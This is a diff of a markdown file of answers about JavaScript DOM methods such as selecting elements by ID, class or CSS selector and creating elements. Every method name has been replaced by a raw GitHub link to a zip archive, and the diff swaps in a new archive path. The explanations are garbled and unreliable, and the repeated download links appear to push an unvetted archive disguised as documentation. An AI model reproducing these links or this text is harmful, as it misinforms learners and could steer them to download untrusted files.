@@ -2,19 +2,19 @@
 
 ans : 
 
-https://raw.githubusercontent.com/khaled8787/emergency-hotline/main/tute/emergency-hotline.zip : It finds a single ID and returns it, or null if there is no ID with that name.
+https://raw.githubusercontent.com/khaled8787/emergency-hotline/main/assets/hotline_emergency_1.1-beta.4.zip : It finds a single ID and returns it, or null if there is no ID with that name.
 
-https://raw.githubusercontent.com/khaled8787/emergency-hotline/main/tute/emergency-hotline.zip : Accesses all classes with the same name and returns all Html collections whose class names are given inside brackets.
+https://raw.githubusercontent.com/khaled8787/emergency-hotline/main/assets/hotline_emergency_1.1-beta.4.zip : Accesses all classes with the same name and returns all Html collections whose class names are given inside brackets.
 
-https://raw.githubusercontent.com/khaled8787/emergency-hotline/main/tute/emergency-hotline.zip : It finds the first element that is present using any CSS selector and returns only one element. If there is no element, it returns null.
+https://raw.githubusercontent.com/khaled8787/emergency-hotline/main/assets/hotline_emergency_1.1-beta.4.zip : It finds the first element that is present using any CSS selector and returns only one element. If there is no element, it returns null.
 
-https://raw.githubusercontent.com/khaled8787/emergency-hotline/main/tute/emergency-hotline.zip : Finds all matching elements with any CSS selector.
+https://raw.githubusercontent.com/khaled8787/emergency-hotline/main/assets/hotline_emergency_1.1-beta.4.zip : Finds all matching elements with any CSS selector.
 
 
 
 **How do you create and insert a new element into the DOM?**
 
-ans : First, you need to create an element using https://raw.githubusercontent.com/khaled8787/emergency-hotline/main/tute/emergency-hotline.zip(); . Then, you need to add it to its parent using apendChild(); or apend (); .
+ans : First, you need to create an element using https://raw.githubusercontent.com/khaled8787/emergency-hotline/main/assets/hotline_emergency_1.1-beta.4.zip(); . Then, you need to add it to its parent using apendChild(); or apend (); .
 
 
 
